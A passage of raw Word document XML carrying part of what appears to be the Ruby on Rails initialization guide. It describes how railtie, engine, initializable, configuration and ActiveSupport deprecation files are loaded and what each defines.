          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Unlike </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> however, this class is not designed to be inherited from. Instead, this is used simply for loading plugins from within an application and an engine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1253836A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file begins by requiring </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/engine.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E53B73" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/engine.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D266F42" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/engine.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class which inherits from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class defines much of the functionality found within a standard application class such as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>routes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468737EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:hyperlink r:id="rId1077" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
          </w:rPr>
          <w:t>API</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> explains the function of this class pretty well.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C79702A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file’s first line requires </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D0D8C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C18CB6C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file is responsible for defining </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the underlying class for all ties to Rails now. Gems that want to have their own initializers or rake tasks and hook into Rails should have a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>GemName::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class that inherits from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E409726" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:hyperlink r:id="rId1078" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
          </w:rPr>
          <w:t>API</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, much like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r>
        <w:t>, explains this class exceptionally well.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF34705" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first require in this file is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/initializable.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F89030" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/initializable.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC06791" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now we reach the end of this particular rabbit hole as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/initializable.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> doesn’t require any more Rails files, only </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tsort</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from the Ruby standard library.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F51EF41" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Initializable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module which contains the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Initializer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class, the basis for all initializers in Rails. This module also contains a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ClassMethods</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class which will be included into the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class when these requires have finished.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655478B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/initializable.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has finished being required from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the next require is for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/configuration</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A6DD3D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/configuration.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40825D2E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Configuration</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module, containing the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>MiddlewareStackProxy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class as well as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Generators</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>MiddlewareStackProxy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class is used for managing the middleware stack for an application, which we’ll see later on. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Generators</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class provides the functionality used for configuring what generators an application uses through the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1079" w:anchor="configuring-generators" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>config.generators</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> option</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643D7677" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first file required in this file is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/deprecation</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F69B62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/deprecation.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B3C483" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file, and the files it requires, define the basic deprecation warning features found in Rails. This file is responsible for setting defaults in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::Deprecation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>deprecation_horizon</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>silenced</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> values. The files that are required before this happens are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42869B20" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="358"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/deprecation/behaviors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F9E3AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="358"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/deprecation/reporting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA067DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="358"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/deprecation/method_wrappers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBDB1CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="358"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/deprecation/proxy_wrappers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115ACC82" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/deprecation/behaviors.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63645231" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the behavior of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::Deprecation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module, setting up the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DEFAULT_BEHAVIORS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> hash constant which contains the three defaults to outputting deprecation warnings: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:stderr</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:log</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:notify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This file begins by requiring </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/notifications</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/core_ext/array/wrap</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB22022" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.15 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/notifications.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E877545" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::Notifications</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module. Notifications provides an instrumentation </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for Ruby, shipping with a queue implementation that consumes and publish events to log subscribers in a thread.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DAAA564" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:hyperlink r:id="rId1080" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
          </w:rPr>
          <w:t>API</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::Notifications</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> explains the usage of this module, including the methods that it defines.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4697D88D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The file required in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/notifications.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/delegation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is documented in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1081" w:anchor="method-delegation" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Active Support Core Extensions Guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5B705D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.16 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/core_ext/array/wrap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F28324" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As this file comprises of a core extension, it is covered exclusively in </w:t>
      </w:r>
      <w:hyperlink r:id="rId1082" w:anchor="wrapping" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>the Active Support Core Extensions guide</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="629DD05F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.17 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/deprecation/reporting.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4FB39D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file is responsible for defining the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>warn</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>silence</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> methods for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::Deprecation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as well as additional private methods for this module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAA657B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.18 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/deprecation/method_wrappers.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7303D22F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>deprecate_methods</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is primarily used by the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>module/deprecation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> core extension required by the first line of this file. Other core extensions required by this file are the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>module/aliasing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>array/extract_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A33F3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.19 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/deprecation/proxy_wrappers.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BE3C90" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>proxy_wrappers.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defines deprecation wrappers for methods, instance variables and constants. Previously, this was used for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>RAILS_ENV</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>RAILS_ROOT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constants for 3.0 but since then these constants have been removed. The deprecation message that would be raised from these would be something like:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
